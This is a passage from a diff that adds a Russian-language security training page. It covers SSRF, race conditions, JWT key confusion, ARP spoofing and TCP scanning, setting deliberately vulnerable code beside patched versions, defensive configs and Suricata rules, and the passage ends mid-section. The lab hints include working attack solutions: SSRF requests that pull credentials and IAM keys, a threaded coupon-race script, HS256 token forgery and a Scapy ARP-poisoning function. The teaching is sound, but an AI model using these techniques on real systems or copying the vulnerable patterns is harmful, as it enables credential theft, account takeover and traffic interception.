+    addr_info = socket.getaddrinfo(hostname, port, family=socket.AF_INET, type=socket.SOCK_STREAM)
+    target_ip_str = addr_info[0][4][0]
+    target_ip = ipaddress.ip_address(target_ip_str)
+    
+    # 2. Проверяем диапазоны: запрещаем Private (RFC 1918), Loopback (127.0.0.0/8), Link-Local (169.254.0.0/16)
+    if target_ip.is_private or target_ip.is_loopback or target_ip.is_link_local or target_ip.is_reserved:
+        raise PermissionError(f"Доступ к внутреннему IP запрещен политикой безопасности: {target_ip}")
+        
+    # 3. Защита от DNS Rebinding: запрос отправляется НАПРЯМУЮ на проверенный IP адрес,
+    # а имя исходного хоста передается строго в заголовке Host!
+    safe_url = f"{parsed.scheme}://{target_ip_str}:{port}{parsed.path or '/'}"
+    headers = {"Host": hostname}
+    return requests.get(safe_url, headers=headers, timeout=3, allow_redirects=False)</code></pre>
+
+              <pre class="code-panel" data-panel="defense"><code># 1. Защита на уровне ядра хоста (iptables / nftables): Блокировка Link-Local адресов
+iptables -A OUTPUT -m iprange --dst-range 169.254.0.0-169.254.255.255 -m owner ! --uid-owner 0 -j DROP
+
+# 2. Принудительное включение IMDSv2 в AWS CLI (запрет токенов v1)
+aws ec2 modify-instance-metadata-options \
+    --instance-id i-0123456789abcdef0 \
+    --http-tokens required \
+    --http-endpoint enabled \
+    --http-put-response-hop-limit 1</code></pre>
+            </div>
+
+            <!-- Tasks -->
+            <div class="tasks-container">
+              <div class="tasks-header">
+                <h4><span>🧪</span> Лабораторные задания по теме</h4>
+                <span style="font-size: 12px; color: var(--text-dim);">3 задачи с верификацией</span>
+              </div>
+
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="ssrf-1">
+                    <div class="task-text">
+                      <div class="task-title">Задание 1.5: Доступ к изолированному хранилищу секретов</div>
+                      <div class="task-desc">Используя эндпоинт <code>/api/v1/fetch</code>, извлечь данные из контейнера <code>lab-internal-vault:8080</code>.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Сервис слушает на порту 8080 во внутренней подсети 172.28.2.0/24. Передайте URL <code>http://172.28.2.50:8080/v1/database/credentials</code>.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code>curl -X POST http://localhost:5000/api/v1/fetch \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://172.28.2.50:8080/v1/database/credentials"}'</code>
+                  </div>
+                </div>
+              </div>
+
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="ssrf-2">
+                    <div class="task-text">
+                      <div class="task-title">Задание 1.6: Имитация кражи токенов облачной роли IAM</div>
+                      <div class="task-desc">Извлечь секретные ключи доступа из эмулированного пути метаданных <code>latest/meta-data/iam/security-credentials/admin-role</code>.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Сформируйте JSON-запрос к эндпоинту fetch на внутренний vault.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code>url: "http://172.28.2.50:8080/latest/meta-data/iam/security-credentials/admin-role"</code>
+                  </div>
+                </div>
+              </div>
+
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="ssrf-3">
+                    <div class="task-text">
+                      <div class="task-title">Задание 1.7: Написание сетевого фильтра и детекта Suricata</div>
+                      <div class="task-desc">Добавить правило в Suricata, детектирующее обращения к внутренним подсетям RFC 1918 из веб-приложения.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Напишите сигнатуру в <code>local.rules</code>, отслеживающую HTTP-запросы из веб-сервера к адресам внутренней зоны.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code>alert http 172.28.1.10 any -> 172.28.2.0/24 any (msg:"SECURITY-ALERT Outbound SSRF to Internal Subnet"; classtype:attempted-admin; sid:2000010; rev:1;)</code>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </article>
+
+        <!-- 1.3 Race Conditions -->
+        <article class="topic-card" id="topic-race" data-roles="red blue">
+          <div class="topic-header">
+            <div class="topic-title-group">
+              <h3>1.3 Race Conditions: ACID транзакции, феномен TOCTOU и атака HTTP/2 Single-Packet</h3>
+              <div class="topic-meta">
+                <span class="badge badge-mitre">MITRE T1068</span>
+                <span class="badge badge-cve">CWE-362</span>
+                <span class="badge badge-level-hard">КОНКУРЕНТНОСТЬ & СЕТИ</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic-body">
+            <div class="theory-block">
+              <div class="theory-text">
+                <div class="theory-subheading">Теоретические основы: ACID и уровни изоляции транзакций</div>
+                <p>
+                  В многопоточных и распределенных системах любая бизнес-операция взаимодействия с базой данных должна соответствовать критериям <strong>ACID</strong>:
+                </p>
+                <ul style="padding-left: 20px; margin-bottom: 8px;">
+                  <li><strong>Atomicity (Атомарность):</strong> Транзакция фиксируется полностью (Commit) или не выполняется вовсе (Rollback).</li>
+                  <li><strong>Consistency (Согласованность):</strong> База данных переходит из одного корректного состояния в другое, не нарушая инвариантов бизнес-логики.</li>
+                  <li><strong>Isolation (Изоляция):</strong> Параллельно исполняемые транзакции не должны оказывать взаимного влияния.</li>
+                  <li><strong>Durability (Долговечность):</strong> Зафиксированные изменения гарантированно сохраняются на энергонезависимом носителе.</li>
+                </ul>
+
+                <div class="theory-subheading">Матрица аномалий параллелизма по стандарту ANSI/ISO SQL</div>
+                <div class="table-responsive">
+                  <table class="theory-table">
+                    <thead>
+                      <tr>
+                        <th>Уровень изоляции</th>
+                        <th>Грязное чтение (Dirty Read)</th>
+                        <th>Неповторяющееся чтение (Non-Repeatable Read)</th>
+                        <th>Фантомное чтение (Phantom Read)</th>
+                        <th>Потерянное обновление (Lost Update)</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><strong>Read Uncommitted</strong></td>
+                        <td><span style="color: var(--accent-crimson);">Возможно</span></td>
+                        <td><span style="color: var(--accent-crimson);">Возможно</span></td>
+                        <td><span style="color: var(--accent-crimson);">Возможно</span></td>
+                        <td><span style="color: var(--accent-crimson);">Возможно</span></td>
+                      </tr>
+                      <tr>
+                        <td><strong>Read Committed</strong> (Дефолт в PG)</td>
+                        <td><span style="color: var(--accent-emerald);">Предотвращено</span></td>
+                        <td><span style="color: var(--accent-crimson);">Возможно</span></td>
+                        <td><span style="color: var(--accent-crimson);">Возможно</span></td>
+                        <td><span style="color: var(--accent-crimson);">Возможно (при отсутствии блокировок)</span></td>
+                      </tr>
+                      <tr>
+                        <td><strong>Repeatable Read</strong> (Дефолт в MySQL)</td>
+                        <td><span style="color: var(--accent-emerald);">Предотвращено</span></td>
+                        <td><span style="color: var(--accent-emerald);">Предотвращено</span></td>
+                        <td><span style="color: var(--accent-crimson);">Возможно (в некоторых СУБД)</span></td>
+                        <td><span style="color: var(--accent-emerald);">Предотвращено</span></td>
+                      </tr>
+                      <tr>
+                        <td><strong>Serializable</strong></td>
+                        <td><span style="color: var(--accent-emerald);">Предотвращено</span></td>
+                        <td><span style="color: var(--accent-emerald);">Предотвращено</span></td>
+                        <td><span style="color: var(--accent-emerald);">Предотвращено</span></td>
+                        <td><span style="color: var(--accent-emerald);">Предотвращено</span></td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+
+                <div class="theory-subheading">Феномен TOCTOU (Time-of-Check to Time-of-Use)</div>
+                <p>
+                  Уязвимость <em>Limit Overrun</em> возникает при паттерне <strong>Check-then-Act</strong>: приложение считывает значение баланса в память процесса веб-сервера, проверяет условие (<code>balance >= price</code>) и затем выполняет запись. В интервале времени между чтением и записью (окно конкурентности) другие потоки веб-сервера успевают прочитать то же самое старое значение баланса!
+                </p>
+
+                <div class="theory-subheading">Физика сетевой атаки HTTP/2 Single-Packet Attack</div>
+                <p>
+                  Раньше для эксплуатации гонок состояний требовалось отправлять десятки TCP-пакетов одновременно, однако джиттер задержки сети (Network Jitter в 5-20 мс) рассинхронизировал их приход на сервер. 
+                  Техника <strong>HTTP/2 Single-Packet Attack</strong> использует мультиплексирование потоков HTTP/2: атакующий упаковывает 20–30 независимых HTTP-запросов (Stream Frames) в <strong>один-единственный физический TCP-сегмент</strong> размером до MTU (1500 байт). 
+                  Сетевая карта сервера принимает этот пакет, распаковывает кадр и передает все 30 запросов в ядро ОС в один и тот же такт процессора (джиттер &lt; 100 наносекунд), гарантируя победу в гонке состояний!
+                </p>
+              </div>
+            </div>
+
+            <!-- Code Viewer -->
+            <div class="code-viewer">
+              <div class="code-tabs">
+                <div class="tab-buttons">
+                  <button class="code-tab-btn tab-vuln active" data-tab="vuln">🔴 Уязвимая логика (TOCTOU)</button>
+                  <button class="code-tab-btn tab-patch" data-tab="patch">🔵 Атомарная блокировка (SELECT FOR UPDATE)</button>
+                </div>
+                <button class="copy-btn"><span>📋 Копировать</span></button>
+              </div>
+
+              <pre class="code-panel active" data-panel="vuln"><code># VULNERABLE: Check-then-Act в приложении без пессимистической блокировки
+@app.route('/api/v1/coupon/redeem', methods=['POST'])
+def redeem_coupon():
+    # 1. Чтение из базы (Check)
+    if coupon_already_redeemed(user_id):
+        return {"error": "Купон уже активирован"}, 400
+
+    # Окно конкурентности: задержка ввода-вывода или сетевой вызов
+    time.sleep(0.05) 
+
+    # 2. Запись в базу (Act)
+    apply_bonus(user_id)
+    mark_coupon_as_used(user_id)
+    return {"status": "Бонус начислен"}</code></pre>
+
+              <pre class="code-panel" data-panel="patch"><code># SECURE: Использование атомарного обновления или SELECT FOR UPDATE
+def redeem_coupon_secure(user_id, coupon_id):
+    with db.transaction():
+        # Атомарная попытка обновления в СУБД:
+        # Условие is_used = 0 проверяется СУБД эксклюзивно на уровне строки!
+        result = db.execute("""
+            UPDATE coupons 
+            SET is_used = 1, redeemed_by = %s, redeemed_at = NOW() 
+            WHERE id = %s AND is_used = 0
+        """, (user_id, coupon_id))
+        
+        # Только один поток в мире получит rowcount == 1!
+        if result.rowcount == 0:
+            return {"error": "Купон уже активирован или заблокирован"}, 400
+            
+        db.execute("UPDATE accounts SET balance = balance + 100 WHERE user_id = %s", (user_id,))
+        return {"status": "Успешно начислено"}</code></pre>
+            </div>
+
+            <!-- Tasks -->
+            <div class="tasks-container">
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="race-1">
+                    <div class="task-text">
+                      <div class="task-title">Задание 1.8: Эксплуатация Limit Overrun скриптом многопоточности</div>
+                      <div class="task-desc">Написать скрипт на Python с <code>concurrent.futures</code> для параллельной отправки 20 запросов активации купона <code>HACK-UNIVERSITY-2026</code>.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Отправьте одновременные POST запросы на <code>/api/v1/coupon/redeem</code> для пользователя alice и проверьте итоговый баланс.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code>import concurrent.futures, requests
+def send_req():
+    return requests.post('http://localhost:5000/api/v1/coupon/redeem', 
+                         json={'username': 'alice', 'coupon': 'HACK-UNIVERSITY-2026'}).json()
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
+    results = list(ex.map(lambda _: send_req(), range(20)))
+print("Успешных начислений:", sum(1 for r in results if r.get('success')))</code>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </article>
+
+        <!-- 1.4 Broken Auth & JWT -->
+        <article class="topic-card" id="topic-jwt" data-roles="red blue">
+          <div class="topic-header">
+            <div class="topic-title-group">
+              <h3>1.4 Broken Auth: Спецификация RFC 7519, математика Key Confusion (RSA vs HMAC) и JWKS</h3>
+              <div class="topic-meta">
+                <span class="badge badge-mitre">MITRE T1556</span>
+                <span class="badge badge-cve">CVE-2016-5431</span>
+                <span class="badge badge-level-hard">КРИПТОГРАФИЯ & AUTH</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic-body">
+            <div class="theory-block">
+              <div class="theory-text">
+                <div class="theory-subheading">Анатомия JSON Web Token (RFC 7519 / RFC 7515)</div>
+                <p>
+                  Структура токена JWS (JSON Web Signature) состоит из трех частей, разделенных точками: <code>Header.Payload.Signature</code>:
+                </p>
+                <ul style="padding-left: 20px; margin-bottom: 8px;">
+                  <li><strong>Заголовок (Header):</strong> Содержит служебные метаданные сериализации (<code>{"alg": "RS256", "typ": "JWT", "kid": "key-2026"}</code>).</li>
+                  <li><strong>Полезная нагрузка (Payload / Claims):</strong> Содержит утверждения о субъекте (RFC 7519 Standard Claims: <code>sub</code> — идентификатор, <code>iss</code> — эмитент, <code>exp</code> — срок годности Unix timestamp, <code>aud</code> — аудитория, <code>nbf</code> — не ранее чем).</li>
+                  <li><strong>Криптографическая подпись (Signature):</strong> Результат вычисления криптографической функции над строкой <code>Base64URL(Header) + "." + Base64URL(Payload)</code>.</li>
+                </ul>
+
+                <div class="theory-subheading">Математическая суть атаки Key Confusion (Algorithm Confusion)</div>
+                <p>
+                  Разница между асимметричной схемой RS256 и симметричной схемой HS256 фундаментальна:
+                </p>
+                <div class="math-block">
+                  <strong>RSA Signature (RS256):</strong><br>
+                  Подпись (приватный ключ d): S = Hash(M)ᵈ mod n<br>
+                  Верификация (публичный ключ e): Hash(M) ≟ Sᵉ mod n<br><br>
+                  <strong>HMAC Signature (HS256):</strong><br>
+                  Подпись и верификация (общий секрет K): HMAC(K, M) = H((K ⊕ opad) || H((K ⊕ ipad) || M))
+                </div>
+                <p>
+                  При атаке <strong>Key Confusion</strong> атакующий подменяет заголовок на <code>"alg": "HS256"</code>. Если библиотека валидации написана некорректно и не имеет жесткого белого списка алгоритмов, она вызывает функцию проверки HMAC, передавая в качестве секретного пароля $K$ сохраненный на сервере открытый ключ <code>public.pem</code>! Так как открытый ключ сервера общедоступен, атакующий берет строку открытого ключа и локально подписывает любой произвольный payload алгоритмом HMAC-SHA256. Сервер сверяет хэш — и подпись сходится на 100%!
+                </p>
+
+                <div class="theory-subheading">Уязвимость алгоритма "none" (RFC 7515 Section 8.5)</div>
+                <p>
+                  Спецификация JWS допускает токены без подписи (для сред, где целостность гарантируется каналом связи TLS). Если заголовок содержит <code>{"alg": "none"}</code>, а сигнатура пуста (<code>eyJhbGciOiJub25lIn0.Payload.</code>), наивный парсер считает токен доверенным, пропуская этап верификации.
+                </p>
+              </div>
+            </div>
+
+            <!-- Code Viewer -->
+            <div class="code-viewer">
+              <div class="code-tabs">
+                <div class="tab-buttons">
+                  <button class="code-tab-btn tab-vuln active" data-tab="vuln">🔴 Уязвимая проверка (Python)</button>
+                  <button class="code-tab-btn tab-patch" data-tab="patch">🔵 Строгий белый список алгоритмов</button>
+                </div>
+                <button class="copy-btn"><span>📋 Копировать</span></button>
+              </div>
+
+              <pre class="code-panel active" data-panel="vuln"><code># VULNERABLE: Доверие полю alg из незащищенного заголовка токена
+@app.route('/api/v1/auth/profile', methods=['GET'])
+def get_profile():
+    token = request.headers.get('Authorization', '').split(' ')[1]
+    # Ошибка: разрешены и симметричный HS256, и асимметричный RS256.
+    # Публичный ключ SERVER_PUBLIC_KEY будет использован как HMAC-пароль!
+    decoded = jwt.decode(token, SERVER_PUBLIC_KEY, algorithms=["HS256", "RS256"])
+    return jsonify(decoded)</code></pre>
+
+              <pre class="code-panel" data-panel="patch"><code># SECURE: Жесткая фиксация ожидаемого асимметричного алгоритма
+@app.route('/api/v1/auth/profile', methods=['GET'])
+def get_profile_secure():
+    token = request.headers.get('Authorization', '').split(' ')[1]
+    
+    # Защита:
+    # 1. Строгий белый список (только RS256)
+    # 2. Обязательная валидация времени жизни (exp) и эмитента (iss)
+    decoded = jwt.decode(
+        token, 
+        SERVER_PUBLIC_KEY, 
+        algorithms=["RS256"], # Блокирует любую попытку передачи HS256 или none!
+        options={"require": ["exp", "iss", "sub"]},
+        issuer="https://auth.university.internal"
+    )
+    return jsonify(decoded)</code></pre>
+            </div>
+
+            <!-- Tasks -->
+            <div class="tasks-container">
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="jwt-1">
+                    <div class="task-text">
+                      <div class="task-title">Задание 1.9: Подделка токена с ролью superadmin</div>
+                      <div class="task-desc">Используя открытый ключ сервера, сгенерировать токен HS256 с подменой роли <code>student → superadmin</code> и получить доступ к <code>/api/v1/auth/profile</code>.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Изучите переменную <code>SERVER_PUBLIC_KEY</code> в <code>app/app.py</code>. Сгенерируйте токен библиотекой <code>pyjwt</code> с алгоритмом HS256 и ключом-строкой.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code>payload = {"username": "admin", "role": "superadmin"}
+token = jwt.encode(payload, SERVER_PUBLIC_KEY, algorithm="HS256")
+curl -H "Authorization: Bearer $token" http://localhost:5000/api/v1/auth/profile</code>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </article>
+      </section>
+
+      <!-- =====================================================================
+           МОДУЛЬ 2: СЕТЕВАЯ ИНФРАСТРУКТУРА И ПРОТОКОЛЫ (L2-L7)
+           ===================================================================== -->
+      <section class="module-section">
+        <div class="module-header">
+          <div class="module-title-wrap">
+            <div class="module-num">02</div>
+            <div>
+              <h2 class="module-title">Сетевая инфраструктура и протоколы (L2–L7)</h2>
+              <div class="module-desc">Канальный уровень (RFC 826), конечный автомат состояний TCP (RFC 793), DNS Cache Poisoning и энтропия туннелирования</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- 2.1 ARP Spoofing -->
+        <article class="topic-card" id="topic-arp" data-roles="red blue">
+          <div class="topic-header">
+            <div class="topic-title-group">
+              <h3>2.1 Канальный уровень (L2): Стандарт RFC 826, переполнение CAM-таблицы и Dynamic ARP Inspection</h3>
+              <div class="topic-meta">
+                <span class="badge badge-mitre">MITRE T1557.002</span>
+                <span class="badge badge-cve">RFC 826 Flaw</span>
+                <span class="badge badge-level-easy">СЕТЕВОЙ СТЕК</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic-body">
+            <div class="theory-block">
+              <div class="theory-text">
+                <div class="theory-subheading">Анатомия протокола ARP (RFC 826)</div>
+                <p>
+                  Протокол разрешения адресов (Address Resolution Protocol) работает на стыке L2 (Ethernet) и L3 (IPv4). 
+                  Его задача — сопоставить 32-битный логический IP-адрес с 48-битным физическим MAC-адресом сетевой карты.
+                </p>
+                <div class="protocol-steps">
+                  <div class="protocol-step">
+                    <div class="step-num">1</div>
+                    <div><strong>ARP Request (Широковещательный Broadcast):</strong> Хост А рассылает по MAC-адресу <code>ff:ff:ff:ff:ff:ff</code> кадр: <em>«У кого IP 192.168.1.1? Сообщите 192.168.1.50»</em>.</div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">2</div>
+                    <div><strong>ARP Reply (Одноадресный Unicast):</strong> Хост с запрошенным IP формирует ответ: <em>«IP 192.168.1.1 находится на моем MAC-адресе 00:11:22:33:44:55»</em>.</div>
+                  </div>
+                </div>
+
+                <div class="theory-subheading">Сравнительная матрица атак канального уровня (L2)</div>
+                <div class="table-responsive">
+                  <table class="theory-table">
+                    <thead>
+                      <tr>
+                        <th>Тип атаки</th>
+                        <th>Механизм эксплуатации</th>
+                        <th>Следствие для сети</th>
+                        <th>Корпоративный механизм защиты</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><strong>ARP Cache Poisoning</strong></td>
+                        <td>Отправка поддельных Unsolicited / Gratuitous ARP ответов. Хосты обновляют кэш без проверки факта отправки запроса.</td>
+                        <td>Перехват трафика (Man-in-the-Middle), модификация или подмена пакетов на лету.</td>
+                        <td><strong>Dynamic ARP Inspection (DAI)</strong> + статическая привязка ARP для шлюзов.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>MAC Flooding (CAM Overflow)</strong></td>
+                        <td>Генерация сотен тысяч поддельных случайных MAC-адресов в секунду. Переполняет Content Addressable Memory (CAM) коммутатора.</td>
+                        <td>Свитч переходит в режим <em>Fail-Open Hub</em> (распространяет все пакеты во все порты, как хаб).</td>
+                        <td><strong>Port Security</strong> (лимит числа MAC-адресов на физический порт, режим <code>violation shutdown</code>).</td>
+                      </tr>
+                      <tr>
+                        <td><strong>DHCP Starvation & Rogue DHCP</strong></td>
+                        <td>Исчерпание пула адресов фальшивыми запросами с разными MAC, после чего поднимается нелегитимный DHCP-сервер.</td>
+                        <td>Подмена основного шлюза и DNS-серверов для всех новых клиентов сети.</td>
+                        <td><strong>DHCP Snooping</strong> (деление портов на Trusted и Untrusted).</td>
+                      </tr>
+                      <tr>
+                        <td><strong>VLAN Hopping (Double Tagging)</strong></td>
+                        <td>Использование вложенных тегов 802.1Q (Outer Tag = Native VLAN, Inner Tag = Target VLAN).</td>
+                        <td>Пакет пересылается коммутатором в изолированный VLAN без прохождения через межсетевой экран.</td>
+                        <td>Перевод Native VLAN на неиспользуемый номер тега (например, VLAN 999).</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+
+                <div class="theory-subheading">Архитектура защиты Dynamic ARP Inspection (DAI)</div>
+                <p>
+                  Коммутаторы корпоративного уровня (Cisco, Huawei, Eltex, Arista) решают проблему доверия через совместную работу двух механизмов:
+                </p>
+                <ul style="padding-left: 20px; margin-bottom: 8px;">
+                  <li><strong>DHCP Snooping:</strong> Перехватывает легитимные DHCP-сообщения от серверов и строит защищенную динамическую базу привязок: <code>[MAC - IP - VLAN - Physical Port - Lease Time]</code>.</li>
+                  <li><strong>DAI (Dynamic ARP Inspection):</strong> Коммутатор физически валидирует каждый проходящий ARP-пакет. Если поле Sender IP и Sender MAC не совпадают с базой DHCP Snooping (или статическим списком ARP ACL), пакет немедленно отбрасывается на аппаратном уровне (ASIC).</li>
+                </ul>
+              </div>
+            </div>
+
+            <!-- Code Viewer -->
+            <div class="code-viewer">
+              <div class="code-tabs">
+                <div class="tab-buttons">
+                  <button class="code-tab-btn tab-vuln active" data-tab="vuln">🔴 Моделирование (Scapy Python)</button>
+                  <button class="code-tab-btn tab-patch" data-tab="patch">🔵 Конфигурация L2 Switch (DAI & Snooping)</button>
+                </div>
+                <button class="copy-btn"><span>📋 Копировать</span></button>
+              </div>
+
+              <pre class="code-panel active" data-panel="vuln"><code># Моделирование двунаправленного ARP-отравления через библиотеку Scapy
+from scapy.all import ARP, send
+import time
+
+def arp_poison(target_ip, target_mac, gateway_ip, gateway_mac):
+    # Кадр для жертвы: говорим, что IP шлюза находится на НАШЕМ MAC-адресе
+    victim_pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+    # Кадр для шлюза: говорим, что IP жертвы находится на НАШЕМ MAC-адресе
+    gateway_pkt = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
+    
+    send(victim_pkt, verbose=False)
+    send(gateway_pkt, verbose=False)</code></pre>
+
+              <pre class="code-panel" data-panel="patch"><code># Корпоративная конфигурация коммутатора (Cisco IOS Hardening)
+! 1. Включение DHCP Snooping
+ip dhcp snooping
+ip dhcp snooping vlan 10,20
+no ip dhcp snooping information option
+
+! 2. Назначение доверенного порта для легитимного DHCP сервера
+interface GigabitEthernet0/1
+ ip dhcp snooping trust
+
+! 3. Включение Dynamic ARP Inspection (DAI) для проверки соответствия привязок
+ip arp inspection vlan 10,20
+ip arp inspection validate src-mac dst-mac ip
+
+! 4. Защита от MAC Flooding (Port Security на клиентских портах)
+interface range FastEthernet0/2 - 24
+ switchport mode access
+ switchport port-security
+ switchport port-security maximum 2
+ switchport port-security violation shutdown</code></pre>
+            </div>
+
+            <!-- Tasks -->
+            <div class="tasks-container">
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="arp-1">
+                    <div class="task-text">
+                      <div class="task-title">Задание 2.1: Анализ аномальных Gratuitous ARP в Wireshark</div>
+                      <div class="task-desc">Выявить факт смены MAC-адреса шлюза по сетевому фильтру <code>arp.duplicate-address-frame</code> в дампах PCAP.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Изучите индикаторы Wireshark: <em>«Duplicate IP address detected»</em>.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    Фильтр Wireshark: <code>arp.opcode == 2 && arp.dst.proto_ipv4 == 192.168.1.100</code>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </article>
+
+        <!-- 2.2 Stealth Scans -->
+        <article class="topic-card" id="topic-scan" data-roles="red blue detection">
+          <div class="topic-header">
+            <div class="topic-title-group">
+              <h3>2.2 Сетевое сканирование: Конечный автомат состояний TCP (RFC 793) и OS Fingerprinting</h3>
+              <div class="topic-meta">
+                <span class="badge badge-mitre">MITRE T1046</span>
+                <span class="badge badge-level-mid">СПЕЦИФИКАЦИЯ TCP</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic-body">
+            <div class="theory-block">
+              <div class="theory-text">
+                <div class="theory-subheading">Конечный автомат состояний протокола TCP (RFC 793)</div>
+                <p>
+                  Протокол TCP обеспечивает надежную доставку потока байтов и представляет собой детерминированный конечный автомат (FSM — Finite State Machine).
+                </p>
+                <div class="protocol-steps">
+                  <div class="protocol-step">
+                    <div class="step-num">1</div>
+                    <div><strong>LISTEN → SYN-SENT:</strong> Клиент отправляет флаг <code>SYN</code> со случайным начальным номером последовательности (ISN — Initial Sequence Number).</div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">2</div>
+                    <div><strong>SYN-SENT → SYN-RECEIVED:</strong> Сервер подтверждает получение флагом <code>ACK</code> (ISN + 1) и отправляет собственный <code>SYN</code>.</div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">3</div>
+                    <div><strong>SYN-RECEIVED → ESTABLISHED:</strong> Клиент подтверждает получение флагом <code>ACK</code>. Соединение зарегистрировано в таблице сокетов ОС.</div>
+                  </div>
+                </div>
+
+                <div class="theory-subheading">Реакция сетевого стека ОС на различные типы сканирования</div>
+                <div class="table-responsive">
+                  <table class="theory-table">
+                    <thead>
+                      <tr>
+                        <th>Тип сканирования</th>
+                        <th>Отправляемые TCP-флаги</th>
+                        <th>Поведение открытого порта</th>
+                        <th>Поведение закрытого порта</th>
+                        <th>Заметность в логах ОС</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><strong>TCP Connect (-sT)</strong></td>
+                        <td>Полное трехстороннее рукопожатие SYN $\rightarrow$ SYN/ACK $\rightarrow$ ACK.</td>
+                        <td>SYN/ACK $\rightarrow$ Соединение открыто (Established).</td>
+                        <td>RST / ACK</td>
+                        <td><strong>Высокая.</strong> Фиксируется системным вызовом <code>accept()</code> во всех веб-серверах.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>SYN Stealth (-sS)</strong></td>
+                        <td>SYN $\rightarrow$ Получение SYN/ACK $\rightarrow$ отправка RST.</td>
+                        <td>SYN/ACK (Порт детектирован как Open).</td>
+                        <td>RST / ACK</td>
+                        <td><strong>Низкая.</strong> Сессия разрывается до передачи сокета в приложение.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>FIN Scan (-sF)</strong></td>
+                        <td>Только флаг FIN (без предшествующего соединения).</td>
+                        <td>Пакет игнорируется (согласно RFC 793).</td>
+                        <td>Ответ RST / ACK.</td>
+                        <td>Скрытное (не работает против стеков Windows).</td>
+                      </tr>
+                      <tr>
+                        <td><strong>NULL Scan (-sN)</strong></td>
+                        <td>Пакет без единого флага (flags = 0).</td>
+                        <td>Пакет игнорируется (согласно RFC 793).</td>
+                        <td>Ответ RST / ACK.</td>
+                        <td>Скрытное (обходит примитивные фаерволы).</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Xmas Scan (-sX)</strong></td>
+                        <td>Комбинация флагов FIN + PSH + URG («горит как елка»).</td>
+                        <td>Пакет игнорируется (RFC 793).</td>
+                        <td>Ответ RST / ACK.</td>
+                        <td>Скрытное в Unix, блокируется NIDS.</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+
+                <div class="theory-subheading">Физика пассивного и активного OS Fingerprinting (Nmap / p0f)</div>
+                <p>
+                  Хотя стандарт TCP описан в RFC 793, разработчики ядер Linux, Windows, FreeBSD и Cisco IOS реализовали параметры по умолчанию по-разному. Это позволяет определять ОС хоста по единственному ответному пакету:
+                </p>
+                <ul style="padding-left: 20px; margin-bottom: 8px;">
+                  <li><strong>Initial TTL:</strong> Linux/Android = 64; Windows = 128; Cisco IOS / Сетевые железки = 255.</li>
+                  <li><strong>TCP Window Size:</strong> Windows обычно использует 8192 или 64240 байт; современные ядра Linux вычисляют динамический размер окна в зависимости от буфера сокета (например, 29200 байт).</li>
+                  <li><strong>Порядок TCP Options:</strong> Linux передает опции: <code>[MSS, SACK Permitted, Timestamps, NOP, Window Scale]</code>. Windows передает другой порядок: <code>[MSS, NOP, Window Scale, SACK Permitted]</code>.</li>
+                </ul>
+              </div>
+            </div>
+
+            <!-- Code Viewer -->
+            <div class="code-viewer">
+              <div class="code-tabs">
+                <div class="tab-buttons">
+                  <button class="code-tab-btn tab-vuln active" data-tab="vuln">🔴 Моделирование пакетов (Scapy)</button>
+                  <button class="code-tab-btn tab-patch" data-tab="patch">🔵 Фильтрация в iptables / nftables</button>
+                  <button class="code-tab-btn tab-def" data-tab="defense">🟣 Сигнатура Suricata NIDS</button>
+                </div>
+                <button class="copy-btn"><span>📋 Копировать</span></button>
+              </div>
+
